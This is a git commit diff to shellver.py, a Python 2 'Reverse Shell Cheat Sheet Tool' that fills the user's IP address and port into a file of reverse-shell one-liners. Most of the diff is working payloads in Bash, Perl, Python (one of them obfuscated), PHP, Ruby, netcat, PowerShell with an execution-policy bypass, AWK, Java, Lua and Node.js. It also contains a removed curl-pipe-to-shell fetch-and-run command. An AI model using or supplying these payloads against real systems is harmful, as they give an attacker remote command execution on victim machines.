bedf883d82152cd0488b9459f770258cfc489677
0xR <42720080+0xR0@users.noreply.github.com>
2018-12-15 17:52:48 +0100

    Update shellver.py

--- shellver.py
+++ shellver.py
@@ -1,12 +1,10 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import argparse
-import sys, os
-import socket
+import argparse, sys, os, re, socket, subprocess
 from requests import get
 from random import choice
-
+from random import choice
 
 def resize():
 	os.system("resize -s 33 95")
@@ -25,31 +23,154 @@ def shell():
         if cw == '2':
 		 ipp = get('https://api.ipify.org').text
 	port = raw_input("Select listening port : ")
+	#os.system("resize -s 43 92")
+	#os.system("clear")
+		
+	rev = """
+╔Bash TCP═══════════════════════════════════════════
+║ bash -i >& /dev/tcp/xxx/yyy 0>&1						    
+║═══════════════════════════════════════════════════
+║ 0<&196;exec 196<>/dev/tcp/xxx/yyy; sh <&196 >&196 2>&196  
+╚═══════════════════════════════════════════════════
 
-	print choice(color) + "					|--Bash TCP--|"
-	print "\n"
-	print choice(color) + "[+] bash -i >& /dev/tcp/{}/{} 0>&1".format (ipp,port)
-	print "\n"
-	print choice(color) + "					|--Perl--|"
-	print "\n"
-	print choice(color) + "[+] perl -e 'use Socket;$i=\"{}\";$p={};socket".format (ipp,port)
-	print """(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""	
-	print "\n"
-	print choice(color) + "					|--Python--|"
-	print "\n"
-	print choice(color) + "[+] python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format (ipp,port)
-	print "\n"
-	print choice(color) + "					|--PHP--|"
-	print "\n"
-	print choice(color) + "[+] php -r \'$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'".format (ipp,port)
-	print "\n"
-	print choice(color) + "					|--Netcat--|"
-	print "\n"
-	print choice(color) + "[+] nc -e /bin/sh {} {}".format (ipp,port)
-	print "\n"
-	print choice(color) + "					|--Curl--|"
-	print "\n"
-	print choice(color) + "[+] curl -s https://shell.now.sh/{}:{}| sh".format (ipp,port)
+
+╔Bash UDP═════════════╦═════════════════════════════
+║ Run Target Machine  ║ sh -i >& /dev/udp/xxx/yyy 0>&1   
+╚═════════════════════╩═════════════════════════════
+
+
+╔PERL═══════════════════════════════════════════════
+║ perl -e 'use Socket;$i="xxx";$p=yyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ 
+╔═══════════════════════════════════════════════════																																												
+║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'									
+											 
+╔══════════════╦════════════════════════════════════
+║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'																					
+  
+════════════════════════════════════════════════════																																												
+
+
+╔PYTHON═════════════════════════════════════════════ 
+║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'    
+
+╔═══════════════════════════════════════════════════																																												
+║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+╔═══════════════════════════════════════════════════
+║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('xxx', yyy)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+     
+════════════════════════════════════════════════════
+
+
+╔PHP════════════════════════════════════════════════
+║ php -r '$sock=fsockopen("xxx",yyy);exec("/bin/sh -i <&3 >&3 2>&3");'
+╚═══════════════════════════════════════════════════
+
+
+╔RUBY═══════════════════════════════════════════════
+║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+                        
+╔═══════════════════════════════════════════════════
+║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+  
+╔══════════════╦════════════════════════════════════
+║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+  
+════════════════════════════════════════════════════
+
+
+╔Netcat Traditional═════════════════════════════════
+║ nc -e /bin/sh xxx yyy
+╚═══════════════════════════════════════════════════
+
+
+╔Netcat OpenBsd═════════════════════════════════════
+║ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx yyy >/tmp/f	
+╚═══════════════════════════════════════════════════
+
+
+╔NCAT═══════════════════════════════════════════════
+║ ncat xxx yyy -e /bin/bash		   
+║═══════════════════════════════════════════════════
+║ ncat --udp xxx yyy -e /bin/bash  
+╚═══════════════════════════════════════════════════
+
+
+╔POWERSHELL═════════════════════════════════════════ 
+║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  
+
+╔═══════════════════════════════════════════════════																																												
+║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxx',yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+════════════════════════════════════════════════════
+
+
+
+╔AWK════════════════════════════════════════════════ 
+║ awk 'BEGIN {s = "/inet/tcp/0/xxx/yyy"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+════════════════════════════════════════════════════																																												
+
+
+╔JAWA═══════════════════════════════════════════════ 
+║ r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+════════════════════════════════════════════════════																																												
+
+
+╔LUA══════════╦═════════════════════════════════════
+║ Linux only  ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+════════════════════════════════════════════════════
+
+╔════════════════════╦══════════════════════════════
+║ Windows and Linux  ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+
+════════════════════════════════════════════════════
+
+
+╔NODEJS═════════════════════════════════════════════ 
+║(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(yyy, "xxx", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+╔═════╦═════════════════════════════════════════════
+║ OR  ║ require('child_process').exec('nc -e /bin/sh xxx yyy')
+╚═════╩═════════════════════════════════════════════
+╔═════╦═════════════════════════════════════════════
+║ OR  ║ -var x = global.process.mainModule.require
+-x('child_process').exec('nc xxx yyy -e /bin/bash')
+
+════════════════════════════════════════════════════
+
+╔JAWA For GROOVY════════════════════════════════════ 
+║ String host="xxx";
+int port=yyy;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+════════════════════════════════════════════════════"""
+	
+	x = open("reverse.txt", "wb")
+	x.write(rev)
+	x.close()
+	print choice(color) + ""
+	subprocess.call(["sed", "s/xxx/"+ipp+"/"";""s/yyy/"+port+"/", "reverse.txt"])
+	
+	
+	
 	print "\n"
 	print choice(color) + "		|--Shell Spawning--|For Details use shellver spawn--|"
 	print choice(color) + "[+] python -c \'import pty; pty.spawn(\"/bin/sh\")\' "
@@ -121,17 +242,14 @@ def banner():
 	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
 
 	print choice(color) + ''' 
-
 				  ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
 				  ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
 				  ╚═╝┴ ┴└─┘╩═╝╩═╝╚╝ └─┘┴└─
-
 					 .:: 0xR ::.
 			    .:: Reverse Shell Cheat Sheet Tool ::.
 				   .:: cyber-warrior.org ::. 
-\033[0m
-	'''
 
+	'''
 
 
 
@@ -158,9 +276,9 @@ def main(arg):
 	|              |                 |                       |                     |   
 	| 1) Linux     | 4) PHP          | 9)  Python            | 13) Linux Based     |   
 	|              |                 |                       |                     |   
-	| 2) Windows   | 5) ASP          [ 10) Bash              | 14) Windows Based   |   
+	| 2) Windows   | 5) ASP          | 10) Bash              | 14) Windows Based   |   
 	|              |                 |                       |                     |   
-	| 3) Mac       | 6) JSP          [ 11) Perl              ] 15) Mac Based       |   
+	| 3) Mac       | 6) JSP          | 11) Perl              | 15) Mac Based       |   
 	|              |                 |                       |                     |   
 	|              | 7) WAR          | 12) Ruby              |                     |   
 	|              |                 |                       |                     |   
